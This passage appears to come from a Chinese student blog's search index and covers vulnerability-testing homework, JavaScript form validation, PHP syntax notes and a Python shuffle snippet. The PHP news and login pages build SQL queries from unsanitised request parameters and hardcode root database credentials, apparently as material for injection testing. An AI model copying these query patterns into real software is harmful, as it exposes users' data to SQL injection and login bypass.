&lt;/tr&gt; &lt;/table&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php // 释放资源 mysql_free_result($result); // 关闭连接 mysql_close($conn); ?&gt; news.php&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" /&gt;&lt;title&gt;主页&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;div align=\"center\"&gt; &lt;table width=\"900\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"&gt; &lt;tr&gt; &lt;td height=\"40\"&gt;&lt;form id=\"form1\" name=\"form1\" method=\"post\" action=\"loginok.php\"&gt; &lt;div align=\"right\"&gt;用户名： &lt;input name=\"username\" type=\"text\" id=\"username\" size=\"12\" /&gt; 密码： &lt;input name=\"password\" type=\"password\" id=\"password\" size=\"12\" /&gt; &lt;input type=\"submit\" name=\"Submit\" value=\"提交\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;hr /&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td height=\"300\" align=\"center\" valign=\"top\"&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt; &lt;?php $conn=mysql_connect(\"localhost\", \"root\", \"123456\"); $newsid = $_GET['newsid']; $SQLStr = \"select * from news where newsid=$newsid\"; $result=mysql_db_query(\"testDB\", $SQLStr, $conn); if ($row=mysql_fetch_array($result))//通过循环读取数据内容 &#123; // 定位到第一条记录 mysql_data_seek($result, 0); // 循环取出记录 while ($row=mysql_fetch_row($result)) &#123; echo \"$row[1]&lt;br&gt;\"; echo \"$row[2]&lt;br&gt;\"; &#125; &#125; // 释放资源 mysql_free_result($result); // 关闭连接 mysql_close($conn); ?&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; loginok.php &lt;?php $loginok=0; $conn=mysql_connect(\"localhost\", \"root\", \"123456\"); $username = $_POST['username']; $pwd = $_POST['password']; $SQLStr = \"SELECT * FROM userinfo where username='$username' and password='$pwd'\"; echo $SQLStr; $result=mysql_db_query(\"testDB\", $SQLStr, $conn); if ($row=mysql_fetch_array($result))//通过循环读取数据内容 &#123; $loginok=1; &#125; // 释放资源 mysql_free_result($result); // 关闭连接 mysql_close($conn); if ($loginok==1) &#123; ?&gt; &lt;script&gt; alert(\"login succes\"); window.location.href=\"sys.php\"; &lt;/script&gt; &lt;?php &#125; else&#123; ?&gt; &lt;script&gt; alert(\"login failed\"); history.back(); &lt;/script&gt; &lt;?php &#125; ?&gt; sys.php注意，书中的添加新闻表格缺少newsid字段，导致插入失败 &lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" /&gt;&lt;title&gt;主页&lt;/title&gt;&lt;/head&gt;&lt;?php $conn=mysql_connect(\"localhost\", \"root\", \"123456\"); ?&gt;&lt;body&gt;&lt;div align=\"center\"&gt; &lt;table width=\"900\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"&gt; &lt;tr&gt; &lt;td height=\"40\"&gt;&lt;form id=\"form1\" name=\"form1\" method=\"post\" action=\"add.php\"&gt; &lt;div align=\"right\"&gt; &lt;label&gt;新闻序号 &lt;input type=\"text\" name=\"newsid\" id=\"newsid\" size=\"50\"/&gt; 新闻标题： &lt;input name=\"topic\" type=\"text\" id=\"topic\" size=\"50\" /&gt; &lt;BR&gt; 新闻内容： &lt;textarea name=\"content\" cols=\"60\" rows=\"8\" id=\"content\"&gt;&lt;/textarea&gt;&lt;BR&gt; &lt;input type=\"submit\" name=\"Submit\" value=\"添加\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;hr /&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td height=\"300\" align=\"center\" valign=\"top\"&gt;&lt;table width=\"600\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"&gt; &lt;tr&gt; &lt;td width=\"100\" height=\"30\"&gt;&lt;div align=\"center\"&gt;新闻序号&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div align=\"center\"&gt;新闻标题&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div align=\"center\"&gt;删除&lt;/div&gt;&lt;/td&gt; &lt;/tr&gt;&lt;?php $SQLStr = \"select * from news\"; $result=mysql_db_query(\"testDB\", $SQLStr, $conn); if ($row=mysql_fetch_array($result))//通过循环读取数据内容 &#123; // 定位到第一条记录 mysql_data_seek($result, 0); // 循环取出记录 while ($row=mysql_fetch_row($result)) &#123; ?&gt; &lt;tr&gt; &lt;td height=\"30\"&gt;&lt;div align=\"center\"&gt; &lt;?php echo $row[0] ?&gt; &lt;/div&gt;&lt;/td&gt; &lt;td width=\"400\"&gt; &lt;div align=\"center\"&gt; &lt;?php echo $row[1] ?&gt; &lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div align=\"center\"&gt;&lt;a href=\"del.php?newsid=&lt;?php echo $row[0] ?&gt; \" &gt; 删除 &lt;/a&gt; &lt;/div&gt;&lt;/td&gt; &lt;/tr&gt;&lt;?php &#125; &#125; ?&gt; &lt;/table&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php // 释放资源 mysql_free_result($result); // 关闭连接 mysql_close($conn); ?&gt; add.php注意添加newsid参数接收 &lt;?php $conn=mysql_connect(\"localhost\", \"root\", \"123456\"); mysql_select_db(\"testDB\"); $newsid=$_POST['newsid']; $topic = $_POST['topic']; $content = $_POST['content']; $SQLStr = \"insert into news(newsid,topic, content) values('$newsid','$topic', '$content')\"; echo $SQLStr; $result=mysql_query($SQLStr); // 关闭连接 mysql_close($conn); if ($result) &#123; ?&gt; &lt;script&gt; alert(\"insert succes\"); window.location.href=\"sys.php\"; &lt;/script&gt; &lt;?php &#125; else&#123; ?&gt; &lt;script&gt; alert(\"insert failed\"); history.back(); &lt;/script&gt; &lt;?php &#125; ?&gt; del.php &lt;?php $conn=mysql_connect(\"localhost\", \"root\", \"123456\"); mysql_select_db(\"testDB\"); $newsid = $_GET['newsid']; $SQLStr = \"delete from news where newsid=$newsid\"; echo $SQLStr; $result=mysql_query($SQLStr); // 关闭连接 mysql_close($conn); if ($result) &#123; ?&gt; &lt;script&gt; alert(\"delete succes\"); window.location.href=\"sys.php\"; &lt;/script&gt; &lt;?php &#125; else&#123; ?&gt; &lt;script&gt; alert(\"delete failed\"); history.back(); &lt;/script&gt; &lt;?php &#125; ?&gt; 向数据库插入数据之后 点击删除","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"php","slug":"php","permalink":"https://gitee.com/michelle19l/michelle19l/tags/php/"}]},{"title":"漏洞测试作业九：Javascript实践","slug":"漏测作业/漏测作业九","date":"2020-05-31T16:00:00.000Z","updated":"2020-06-12T04:07:53.822Z","comments":true,"path":"2020/06/01/漏测作业/漏测作业九/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B9%9D/","excerpt":"","text":"web开发javascript 题目：搭建PHPNOW的开发环境，然后制作一个Html页面，并利用Javascript实现页面元素是否输入的校验，如果没有输入，则将焦点设置在该页面元素上 解答PHPNOW环境搭建系统：windows xp 将压缩包解压后，粘贴到虚拟机内，点击setup,选择需要的Apache和MySql版本，我这里选择的是20和50，执行解压 输入y，进行初始化，设置mysql密码，这里设置为123456 设置完成： 输入密码，点击连接，测试成功 点击phpMyAdmin,进入数据库管理页面，输入用户名root,密码123456 安装成功 制作Html页面内容学习 安装Dreamweaver htdocs文件夹为当前网站工作的根目录，在该目录先新建文件js.htm,并用Dreamweaver打开 一个简单的html： &lt;html&gt;&lt;head&gt;&lt;title&gt;Javascript example!&lt;/title&gt;&lt;/head&gt;&lt;body&gt;1111&lt;/body&gt;&lt;/html&gt; document.write()函数 &lt;html&gt; &lt;head&gt; &lt;title&gt;Javascript简单示例&lt;/title&gt; &lt;script language=\"javascript\"&gt; for(i=1;i&lt;=100;i++)&#123; num=Math.floor(Math.random()*100);//0-99之间的随机数 document.write(num,\" \");//向body区域写入内容 &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 函数调用 &lt;html&gt; &lt;head&gt; &lt;title&gt;Javascript简单示例&lt;/title&gt; &lt;script language=\"javascript\"&gt; function func1() &#123;alert(\"function1 has been called\");&#125; function func2() &#123;alert(\"function2 has been called\");&#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;input name=\"click\" type=\"button\" id=\"click\" onclick=\"func1(),func2()\" /&gt; &lt;/body&gt;&lt;/html&gt; 利用设计界面插入按钮 更改按钮名称 效果： 声明对象 &lt;html&gt; &lt;head&gt; &lt;title&gt;Javascript example&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script language=\"javascript\"&gt; function student(name,school,grade)&#123; this.name=name; this.school=school; this.grade=grade; &#125; hui=new student(\"nothing_gonna\",\"xx school\",\"seconde grade\"); with(hui) &#123; document.write(name+\":\"+school+\",\"+grade+\"&lt;br/&gt;\");&#125; if(window.hui)&#123; document.write(\"object hui exists\"); &#125; else document.write(\"object hui doen't exists\"); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 验证文本框输入内容 &lt;html&gt; &lt;head&gt; &lt;title&gt;Javascript example&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script language=\"javascript\"&gt; function getLoginMsg() &#123; loginMsg=document.LoginForm; alert(\"id:\"+loginMsg.userID.value+\"\\n\"+\"password:\"+loginMsg.password.value); &#125; function setLoginMsg(Object)&#123; alert(Object.id); &#125; &lt;/script&gt;&lt;form id=\"LoginForm\" name=\"form1\" action=\"1.php\" method=\"get\"&gt; &lt;label&gt;userID: &lt;input type=\"text\" name=\"userID\" /&gt; &lt;br /&gt; password: &lt;input type=\"text\" name=\"password\" /&gt; &lt;br /&gt; &lt;/label&gt; &lt;p&gt; &lt;label&gt; &lt;input type=\"button\" value=\"login\" onclick=\"getLoginMsg()\"/&gt; &lt;/label&gt; &lt;label&gt; remember me &lt;input type=\"checkbox\" name=\"checkbox\" value=\"checkbox\" onclick=\"setLoginMsg()\"/&gt; &lt;/label&gt; &lt;/p&gt;&lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 利用Javascript实现页面元素是否输入的校验，如果没有输入，则将焦点设置在该页面元素上==设置焦点的函数：document.getElementById(“文本域的id”).focus();== &lt;html&gt;&lt;head&gt;&lt;title&gt;作业&lt;/title&gt;&lt;/head&gt; &lt;script language=\"javascript\"&gt; function judge() &#123; Msg=document.LoginForm if(Msg.one.value==\"\") &#123; document.getElementById(\"i1\").focus(); &#125; else if(LoginForm.two.value==\"\") &#123; document.getElementById(\"i2\").focus(); &#125; else if(LoginForm.thr.value==\"\") &#123; document.getElementById(\"i3\").focus(); &#125; else alert(\"1:\"+Msg.one.value+\"\\n2:\"+Msg.two.value+\"\\n3:\"+Msg.thr.value); &#125; &lt;/script&gt;&lt;body&gt; &lt;form id=\"LoginForm\" name=\"form1\" method=\"get\"&gt; &lt;label&gt;1st &lt;input type=\"text\" name=\"one\" id='i1'&gt; &lt;/label&gt; &lt;p&gt; &lt;label&gt;2nd &lt;input type=\"text\" name=\"two\" id='i2'&gt; &lt;/label&gt; &lt;/p&gt; &lt;p&gt; &lt;label&gt;3rd &lt;input type=\"text\" name=\"thr\" id='i3'&gt; &lt;/label&gt; &lt;/p&gt; &lt;p&gt; &lt;label&gt; &lt;input type=\"button\" value=\"提交\" onclick=\"judge()\"&gt; &lt;/label&gt; &lt;/p&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; ==提交按钮的type应该使button而不是submit，否则点击后会刷新表单并清空⬇⬇⬇⬇⬇⬇== ==chrome浏览器无法正常运行该文件，这里使用Microsoft edge可以正常使用==","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"web开发","slug":"web开发","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web%E5%BC%80%E5%8F%91/"},{"name":"javascript","slug":"javascript","permalink":"https://gitee.com/michelle19l/michelle19l/tags/javascript/"}]},{"title":"php学习一 —— 基本语法","slug":"php/php1","date":"2020-05-26T12:03:31.000Z","updated":"2020-06-12T08:17:12.260Z","comments":true,"path":"2020/05/26/php/php1/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/05/26/php/php1/","excerpt":"","text":"参考书籍《细说PHP》 第一个php脚本程序将.php文件放在web服务器根目录下，访问web服务器URL/xxx.php,本地访问http://localhost/xxx.php. 调用函数phpinfo()可以看到系统相关信息、预定义变量，以及已经加载的php模块和配置信息 php语言标记将php代码嵌入html中的位置可以将php代码段嵌入到html的任意地方 当php遇到结束符 “?&gt;” 时，简单地将后面的内容原样输出，只到遇到下一个开始标记位置 在一个文件中的不同位置使用多个php标记时，这些标记之间的语法是一个整体 对于输出打断文本而言，脱离php的解析模式，比php的echo和print效率更高 解读开始和结束标记 ⭐&lt;?php ?&gt;⭐和&lt;? ?&gt;当在html页面中嵌入纯变量时，也可以使用&lt;?=$variablename ?&gt; &lt;script language=”php”&gt;&lt;/script&gt; (PHP7以前版本支持)&lt;% %&gt; (PHP7以前版本支持) 除非有特殊需求，否则使用&lt;?php ?&gt;,对于只包含php代码的文件，结束标识符最好不要存在，防止末尾被意外地注入空白符号 指令分隔符“分号”使用; 程序最后一行，即?&gt;前，可以不用分号 程序注释多行：/* */ 单行：//和# 多行注释无法嵌套多行注释，其它可以嵌套 单行注释只对php内容有效，//?&gt;之后的html代码将被显示出来 在程序中使用空白处理空格、Tab、换行被php引擎忽略 代码规范： 使用两个空行 一个源文件的两个代码片段之间 两个类的声明之间 使用一个空行 两个函数声明之间 函数内的局部变量和函数的第一条语句之间 块注释或单行注释之前 使用空格增加代码缩进提高可读性 关键字与括号之间，注意函数名和左括号之间不能有空格 函数参数列表的逗号后 算式的操作符和运算符之间，二进制运算和一元运算除外 for语句中的逗号后 强制类型转换语句中的强制类型的右括号与表达式之间应该用逗号隔开，并添加空格 变量建议所有用到数据的地方，先将数据赋值给一个变量 变量的声明&lt;?php $a = 100; $b = \"string\"; $c = true; $d = 99.99; $key1 = $a; //声明变量$key1,将$a的值赋给$key1 $key2 = $b; $a = $b = $c = $d = \"value\"; //同时声明多个变量，并附上相同的值 变量的作用域： 大部分不是在函数中声明的变量，可以在一个页面的所有php模式下使用，包含include和require引入的文件 如果使用了Cookie和Session，可以在多个页面中使用 &lt;?php $var = ''; //声明变量$var并赋值空 if(empty($var))&#123; //true，因为$var为空值 echo \"$var is either 0 or not set at all\"; &#125; if(!isset($var))&#123; //false，$var已经设置 echo \"$var is not set at all\"; &#125; unset($var); //销毁$var，释放内容 if(isset($var))&#123; //false，$var已经销毁 echo \"this var is set so i will print\" &#125; 如果empty()的参数是非零或者非空的值，则返回false“”、0、“0”、NULL、FALSE、array()、$var及任何没有属性的对象都被认为是空的如果参数为空，则返回true 如果函数isset()的参数存在，则返回TRUE，否则返回FALSE若参数是一个被设置成NULL的变量或已使用unset()释放，将返回FALSE NULL字节（”\\0”）不等同于PHP的NULL常数，推荐使用!empty($var)的方式判断一个变量存在且不为空 变量的命名变量名严格区别大小写 内置结构和关键字及用户自定义的类名不区分大小写，如echo、while、class名称、function名称 字母或下划线开头 PHP常用关键字 and or xor if else for foreach while do switch case break continue default as elseif declare endif endfor endforeach endwhile endswitch enddeclare array static const class extends new exception global function exit die echo print eval isset unset return defien defined include include_once require require_once cfunction use var Public private protected implements interface extends abstract clone try catch throw 可变变量&lt;?php $hi = \"hello\"; //声明一个普通变量$hi $$hi = \"world\"; //声明一个可变变量$$hi, //$hi的值是hello,相当于声明$hello的值是“world” echo \"$hi $hello\\n\"; //输出hello world echo \"$hi $&#123;$hi&#125;\\n\"; //输出hello world echo \"$hi $$hi\\n\"; //输出hello $hello 运行结果 变量的引用赋值 $a=&amp;$b php C++ b是a的别名 √ √ 其中一个的值改变会导致另外一个改变 √ √ 将$b的引用赋值给$a 地址指针 释放其中一个 解除a、b的值关联关系，只释放一个 两个都释放 变量的类型 &lt;?php $str=\"hello world\"; var_dump($str);//直接输出变量的类型和值 布尔型被认为是FALSE的值 FALSE 0、0.0 “\\0”、”0” 没有成员变量的数组 没有单元的对象（仅限php4） 特殊类型NULL、尚未设定的变量 &lt;?php var_dump((bool) \"\");//false,“”的布尔值是false 整型&lt;?php $int = 1234; $int = -123; $int = 0123; $int = 0x1A; $int = 0b1111;//二进制 &lt;?phpecho PHP_INT_SIZE; //int占四个字节，8echo PHP_INT_MAX; //int最大值，9223372036854775807echo PHP_INT_MIN; //int最小值，-9223372036854775808 php没有无符号整数，超出范围后会被解释为float（这点和其它编译器有出入） eg. &lt;?phpvar_dump((int) 9223372036854775810);输出为int(-9223372036854775808) 浮点型&lt;?php $float = 1.234; $float = 1.2e3; $float = 7E-10; 字符串php字符串没有长度限制 单引号&lt;?php //这是一个使用单引号引起来的简单字符串 echo 'this is a simple string'; this is a simple string &lt;?php //在单引号中如果需要在包含单引号，需要使用转义字符“\\” echo 'this is a \\'simple\\' string'; this is a ‘simple’ string &lt;?php //只能将反斜杠转义输出一个反斜杠，其它输出都是无效的 echo 'this \\n is \\r a \\t simple string\\\\'; this \\n is \\r a \\t simple string\\ &lt;?php $str = 100; //将变量名原样输出，不会在单引号中解析这个变量 echo 'this is a simple $str string'; this is a simple $str string 双引号 可以使用更多特殊字符的转义序列 可以解析变量、数值组、或者对象属性的方法 用花括号括起表达式 转义字符 含义 \\n 换行符 \\r 回车符 \\t 水平制表符 \\\\ 反斜线 \\$ 美元符号 \\“ 双引号 \\[0-7]{1,3} 正则，匹配一个用八进制符号表示的字符 \\x[0-9A-Fa-f]{1,2} 正则，匹配一个用十六进制符号表示的字符 \\u{xxxxx} 声明unicode字符（php7引入） &lt;?php $beer = 'heineken'; //可以解析，'在变量名中是无效的 echo \"$beer's taste is great\";?&gt; heineken’s taste is great &lt;?php //不可以解析，s在变量名中有效 echo \"he drank some $beers\";?&gt; he drank some &lt;?php //使用&#123;&#125;包含，可以将变量分离出来解析 echo \"He drank some $&#123;beer&#125;s\";?&gt; He drank some heinekens &lt;?php //可以解析，&#123;&#125;的另一种用法 echo \"he drank some &#123;$beer&#125;s\";?&gt; he drank some heinekens 解析unicode，php7开始支持 &lt;?php echo \"u\\&#123;4f5c&#125; u\\&#123;8005&#125; u\\&#123;5f88&#125; u\\&#123;5e05&#125;\"; 定界符&lt;&lt;&lt; 定界符的命名规则和变量相同 通常用于从文件或者数据库中打断地输出文档 转义和变量解析同双引号 &lt;?php \\$string = &lt;&lt;&lt;EOT xxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxEOT;//结束标识必须从行的第一列开始，且后面不能有除分号外的其它字符//EOT也课换为其它命名 echo \\$string; //解析变量、字符转义 $name = 'MNname'; echo &lt;&lt;&lt;EOT my name is $name. I am printing a \"string\" \\n. \\tNow, i am printing some new line \\n\\r. \\tthis should print a capital 'A'EOT; &lt;?php //定界符不能用来初始化类成员 //不可以这么写！！！！！！！ class foo&#123; public $bar = &lt;&lt;&lt;EOT barEOT;&#125; 在开始边界符字符串名称两边加上单引号和双引号（”EOT”），作用类似于单引号\\双引号字符串 不加双引号时，作用同双引号 echo &lt;&lt;&lt;\"EOT\" xxxxxxxxxx \\x41EOT; 数组PHP的数组实际上是一张有序图 &lt;?php /* array( key1 =&gt; value1, key2 =&gt; value2 .... ) key可以是integer或者string value可以是任意值 */ $arr = array(\"foo\" =&gt; \"bar\",12 =&gt; true); print_r($arr); //print_r()函数检查数组内的全部内容 echo $arr[\"foo\"]; //通过数组下标访问单个数据 echo $arr[12]; print_r()输出： Array( [foo] =&gt; bar [12] =&gt; 1) 对象&lt;?php class Person&#123; var $name; function say()&#123; echo \"Doing foo.\" &#125;&#125; $p = new Person;//用new语句实例化类Person的对象放在变量$p中 $p-&gt;name=\"TOM\"; $p-&gt;say(); 资源资源类型的变量保存了到外部资源的一个引用 资源是通过专门的函数来建立和使用的 使用类型变量包含：打开的文件、数据库连接、图形画布区域等的特殊句柄，并由程序员创建使用和释放 在下面的实例中，使用相应的函数创建不同的资源变量，如果创建成功，则返回资源引用赋给变量；如果创建失败，则返回布尔型false &lt;?php //使用fopen()函数以写的方式打开本目录下的info.txt文件，返回文件资源赋给变量$file_handle $file_handle = fopen(\"info.txt\",\"w\"); var_dump($file_handle);//输出$resource(3) of type (stream) //使用opendir()函数打开目录，返回目录资源 $dir_hanle = opendir(\"C:\\\\WINDOWS\\\\Fonts\"); var_dump($dir_handle);//输出$resource(4) of type (stream) //使用mysql_connect()连接本地的MySql，返回连接资源 $link_mysql = mysql_connect(\"localhost\",\"root\",\"123456\"); var_dump($link_mysql);//输出$resource(5) of type (mysql link) //使用imagecreate()创建一个100*50像素的画板，返回图像资源 $im_handle = imagecreate(100,50); var_dump($im_handle);//输出$resource(6) of type (gd) //使用xml_parser_create()创建XML解析器资源 $xml_parser = xml_parser_create(); var_dump($xml_parser);//输出$resource(7) of type (xml) NULLNULL不区分大小写 以下被认为是NULL 直接赋值为NULL 声明的变量未赋值 被unset()函数销毁的变量 伪类型 mixed：说明一个参数可以接受多种不同的类型 number：说明一个参数可以是integer或float callback 类型转换自动转换&amp;强制转换 自动类型转换向长度增加方向进行 bool&amp;null&amp;string -&gt; integer/float int -&gt; float string转化字符串的数字部分,”123abc”-&gt; （int）123，“123.45abc” -&gt; (float) 123.45 &lt;? $foo = \"100page\"; //string $foo += 2; //int,102 $foo = $foo + 1.3; //float,103.3 $foo = null + \"10 little piggies\"; //int,10 $foo = 5 + \"10.05 yuan\" //float,15.05 强制类型转换类似于C++， (int),(bool),(float),(string),(array),(object)，没有改变变量本身的类型 &lt;?php //没有改变变量本身的类型 $str = \"123.45abc\"; $int = intval($str); $flo = floatval($str); $str = strval(123.45);//“123.45” &lt;!--￼25--&gt; PHP7废除16进制字符串，原先“0xA”被识别为10，而新版被识别为0 变量类型的测试函数 is_bool($var) is_int(), is_integer(), is_long() is_float(), is_double(), is_real() is_string() is_array() 判断是否为数组 is_object() is_resource is_null() is_scalar()判断是否是标量——整数、浮点数、布尔型、字符串 is_numeric() 判断是否有任何类型的数字或数字字符串 is_callable() 判断是否是有效的函数名 常量只能是标量数据 常量名前不要加$ 常量一旦定义后就不能重新定义或者取消定义，直到脚本运行结束自动释放 &lt;?php define(\"CON_INT\",100); echo CON_INT;//获取常量值 constant(CON_INT);//动态获得常量值 get_defined_constants();//获得所有已定义的常量列表//const和define定义数组 const ARR=['a','b']; define(\"BRR\",['a','b']); define 和 const 比较const用于类成员常量和全局常量，但是不能在条件语句中定义常量 &lt;?php//const编译时更快 if(true) const FOO='BAR';//无效，cosnt不可以在条件语句中使用 if(true) define(\"FOO\",'CAR')//可以 const只能用于普通变量名 &lt;?php const FOO='BAR'; for ($i = 0;$i&lt;32;++$i) define('YDMA_'.$i,1+$i); echo YDMA_ 系统中的预定义常量 常量名 常量值 说明 PHP_OS UNIX或WINNT等 执行PHP解析的操作系统名称 PHP_VERSION 7.1.9等 当前PHP服务器的版本 TRUE TRUE FALSE FALSE NULL NULL DIRECTORY_SEPARATOR \\或/ PATH_SEPARATOR ;或: 更具操作系统决定环境变量的目录列表分割符 E_ERROR 1 错误 E_WARNING 2 警告 E_PARSE 3 解析错误，由程序解析器报告 E_NOTICE 4 非关键的错误，例如变量未初始化 M_PI 3.1415926535898 魔术常量 常量名 常量值 说明 _FILE_ 当前的文件名 _LINE_ 当前行数 _FUNCTION_ 当前函数名 _CLASS_ 当前类名 在哪个类中使用就代表哪个类的类名 _METHOD_ 当前对象的方法名 在哪个对象的方法中使用就代表这个方法名 &lt;?php echo PHP_OS.\"&lt;br&gt;\"; echo PHP_VERSION.\"&lt;br&gt;\"; echo __FILE__.\"&lt;br&gt;\"; echo __LINE__.\"&lt;br&gt;\"; echo __line__.\"&lt;br&gt;\"; 运算符+、-、、/、++、–、* ==和C不同的地方== &lt;?php $i = 'a';for($n = 0;$n &lt; 52;$n++)&#123; echo ++$i.\"\\n\";&#125; 输出：b c d e f g h i j k l m n o p q r s t u v w x y z aa ab ac ad ae af ag ah ai aj ak al am an ao ap aq ar as at au av aw ax ay az ba 字符串运算连接：“.” 赋值运算$x.=”3” 代表$x=​$x.”3” 其余同其他语言 比较运算符 运算符 描述 说明 示例 === 全等于 在==的基础上添加“类型相同” $a===$b !== 非全等于 操作数不相等或类型不同 &lt;&gt; / != 不等于 &lt;=&gt; 太空船运算符/组合比较运算符 当左边小于、等于、大于右边时，分别返回-1，0，1（==可用于字符串比较==） $a&lt;=&gt;$b ?? NULL合并操作符 从左往右第一个存在切不为NULL的操作数如果都没有定义切不为NULL则返回NULL $a ?? $b ?? $c &lt;?php //下面两条语句等价 $username = $_GET['user'] ?? 'nobody'; $username = isset($_GET['user']) ? $_GET['user'] : 'nobody'; 逻辑运算符短路 and、&amp;&amp; or、|| not、！ xor 位运算符同C++ $a &amp;= $b 等价于 $a = $a &amp; $b $a &gt;&gt;=$b 等价于 $a = $a&gt;&gt;$b 其他运算符 运算符 描述 示例 ?: `` 执行运算符 @ 错误空值运算符，忽略表达式产生的错误信息 @表达式 =&gt; 数组加标指定符 键=&gt;值 -&gt; 对象成员访问 instanceof 类型运算符，用来测定一个给定的对象是否来自指定的对象类 对象instanceof类名 &lt;?php $output = 'ls-la';//使用``执行服务器操作系统的命令，讲结果赋值给$output echo \"&lt;pre&gt; $output &lt;/pre&gt;\"; $my_file = @file(\"non_existent_file\"); @$num = 100/0; //使用头发送函数前面不能有任何输出，空格、空行都不行，否则会产生警告 @header(\"Location: http://www.brophp.com\"); 运算符优先级 级别（从高到低） 运算符 2 [ 3 ++，– 4 ！，~，-，(int)，(float)，(string)，(array)，(object)，@ 5 *，/，% 6 +，- 7 &lt;&lt;，&gt;&gt; 8 &lt;，&lt;=，&gt;，&gt;= 9 ==，!=，===，!==，&lt;&gt;，&lt;=&gt; 10 &amp; 11 ^ 12 | 13 &amp;&amp; 14 || 15 ?? 16 ?: 17 =，+=，-=，*=，/=，.=，%=，&amp;=，|=，^=，&lt;&lt;=，&gt;&gt;= （结合方向：从右到左） 18 and 19 xor 20 or 21 , 容易混淆的特殊值1代表true 0代表false 表达式 gettype() empty() is_null() isset() boolean():if($x) $x=”” string 1 0 1 0 $x=null null 1 1 0 0 $x is undefined null 1 1 0 0 var $x null 1 1 0 0 $x=array() array 1 0 1 0 $x=false boolean 1 0 1 0 $x=true boolean 0 0 1 1 $x=1 integer 0 0 1 1 $x=42 integer 0 0 1 1 $x=0 integer 1 0 1 0 $x=-1 integer 0 0 1 1 $x=”1” string 0 0 1 1 $x=”0” string 1 0 1 0 $x=”-1” string 0 0 1 1 $x=”php” string 0 0 1 1 $x=”true” string 0 0 1 1 $x=”false” string 0 0 1 1","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"php","slug":"php","permalink":"https://gitee.com/michelle19l/michelle19l/tags/php/"}]},{"title":"python列表随机打乱顺序","slug":"list打乱","date":"2020-05-25T13:03:31.000Z","updated":"2020-05-25T15:04:32.929Z","comments":true,"path":"2020/05/25/list打乱/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/05/25/list%E6%89%93%E4%B9%B1/","excerpt":"","text":"import randomn=eval(input())m=list(range(1,n+1))print (\"随机排序列表 : \", list)for i in range(0,n): random.shuffle(m) # shuffle函数是将原list打乱而不是返回一个新的list for j in range(0,n): print(m[j],end=' ') print()","categories":[{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/tags/python/"},{"name":"random.shuffle","slug":"random-shuffle","permalink":"https://gitee.com/michelle19l/michelle19l/tags/random-shuffle/"}]},{"title":"php学习二 —— 流程控制结构","slug":"php/php2","date":"2020-05-25T13:03:31.000Z","updated":"2020-06-12T08:14:42.959Z","comments":true,"path":"2020/05/25/php/php2/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/05/25/php/php2/","excerpt":"","text":"参考书籍《细说PHP》 简易计算器&lt;html&gt; &lt;head&gt; &lt;title&gt;php calculator&lt;/title&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\" /&gt; &lt;/head&gt;&lt;?php $error=\"\";//声明一个错误信息 $num1=$_POST[\"num1\"]; //初始化第一个数 $num2=$_POST[\"num2\"]; //初始化第二个数 $operator=$_POST[\"operator\"]; //单路分支，使用isset判断用户是否有提交条件 if(isset($_POST[\"sub\"]))&#123; 